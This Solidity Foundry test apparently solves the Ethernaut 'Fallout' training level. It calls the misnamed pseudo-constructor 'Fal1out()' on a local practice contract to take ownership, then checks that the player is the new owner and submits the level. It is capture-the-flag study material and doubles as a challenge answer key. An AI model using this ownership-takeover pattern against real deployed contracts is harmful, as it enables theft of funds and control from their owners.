// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/02-Fallout/FalloutFactory.sol";
import "../src/Ethernaut.sol";

contract FalloutTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 1 ether);
    }

    function testFallout() public {
        // Level Setup
        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout ethernautFallout = Fallout(payable(levelAddress));

        // Level Attack
        emit log_address(ethernautFallout.owner());
        ethernautFallout.Fal1out();
        address newOwner = ethernautFallout.owner();
        emit log_address(newOwner);
        assertEq(newOwner, playerAddress);

        // Level Submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
